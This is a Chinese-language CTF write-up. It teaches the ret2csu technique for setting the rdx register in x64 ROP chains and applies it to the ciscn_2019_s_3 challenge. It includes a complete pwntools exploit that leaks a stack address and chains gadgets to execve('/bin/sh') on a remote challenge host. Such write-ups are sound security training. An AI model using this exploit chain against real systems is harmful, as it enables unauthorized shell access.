## ret2csu

### 知识点：如何给rdx寄存器传参

1. 64位程序进行传参时 **前6个值** 通过寄存器传递，但是在 **ROPgadget** 中rsi，rdi寄存器很普遍，但rdx这类寄存器且很难寻找到，所以需要 **利用到csu对rbx** 进行传参。这时候，我们可以利用 x64 下的 **__libc_csu_init** 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。

2. 仔细观察一下 **__libc_csu_init** 函数的汇编实现，可以发现存在一条指令 **mov     rdx, r13** ，最后面的6个pop指令由可以对r13赋值，ret又能直接跳转到**mov     rdx, r13**处，简直两全其美，但是后面存在一些多余的指令：

   ![image-20240603205939162](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202406032059248.png)

3. 如何变向去掉后面多余的指令：call指令前面两条mov不必理会，可以直接给rsi和edi设置随机值（在构造ROP链时将给rsi和rdi传参的部分放在利用csu传参的后面，即可覆盖掉原rsi和rdi，这也确定了我们ROP链上传递参数的顺序）。从call指令开始分析：call指令会将 **r12+rbx*8** 这个值当作内存单元的地址，取该地址处取一个值，将该值作为IP的值从该地址处开始执行指令。所以要想 **r12+rbx*8** 跳转到一个位置执行指令，就要将 **存储该指令地址的内存单元地址** 付给r12（这里假设rbx=0，我们可以在pop rbx时直接将rbx赋值位0，然后pop r12时将所需地址给r12），后面绕过cmp jnz可以在pop时将rbx赋值为0，rbp赋值为1，这可以让其在执行完add指令后即可跳处出循环到**loc_400596** 处，接下来add rsp将sp指针在栈上向下跳了一格，所以需要 **7个垃圾数据** 进行填充，后面才是返回值地址。

### 例题：[ciscn_2019_s_3](https://buuoj.cn/challenges#)

1. 进入函数，是通过syscall来调用函数read和write，而execve函数的系统调用号是0x3B，可以构造 **execve(“/bin/sh”,0,0)** 来拿到shell，64 为的程序参数对应依次为rax=0x3B，rdi=“/bin/sh”、rsi=0、rdx=0。

   ![image-20240606213208176](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202406062132253.png)

2. 其中rax传参可以直接利用程序中的 **gadgets函数** ，rdi、rsi可以用ROPgadget查找，最后主要是rdx传参，就需要用到前面的cus：

   ![image-20240606213951730](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202406062139766.png)

3. 注意程序的结束位置是直接ret，相当于直接返回了进入函数是bp寄存器的值指向的地址处，所以溢出只用 **溢出到bp寄存器** 的位置：

   ![image-20240606213357371](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202406062136052.png)

2. EXP：

   ```python
   from pwn import *
   from LibcSearcher import *
   context(os='linux', arch='amd64', log_level='debug')
   
   p=remote("node5.buuoj.cn",28175)
   elf=ELF('./ciscn_s_3')
   
   ret = 0x4005A4
   main_addr = 0x4004ED
   pop_rdi_ret = 0x4005a3
   pop_rsi_r15_ret = 0x4005a1
   mov_rax_ret = 0x4004e2
   csu = 0x400580
   pop_rbx_rbp_r12_r13_r14_r15_ret = 0x40059A
   gadget_rax = 0x4004E2
   syscall = 0x400517
   vuln = 0x4004ED
   
   #经过调试，返回值只需要填充到bp的位置即可，不需要覆盖真正的返回值
   payload = b'a'*0x10+p64(vuln)
   p.sendline(payload)
   p.recv(0x20)
   addr = u64(p.recv(8))
   print(hex(addr))
   bin_addr = addr-0x118
   
   payload  = p64(ret)+b'/bin/sh\00'		#刚好16个字节，填充到bp的位置
   payload += p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(0)+p64(1)+p64(bin_addr)+p64(0)+p64(0)+p64(0)+p64(csu)+p64(0)*7		#bin_addr是ret指令地址的地址，call [r12]可以直接跳转到ret指令然后返回，rsi也会自动被初始化为0，后面不用单独安排传参
   payload += p64(mov_rax_ret)+p64(pop_rdi_ret)+p64(bin_addr+8)+p64(syscall)
   
   p.sendline(payload)
   
   p.sendline(b'cat flag')
   p.interactive()
   
   ```
   

![image-20240603211701004](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202406032117121.png)

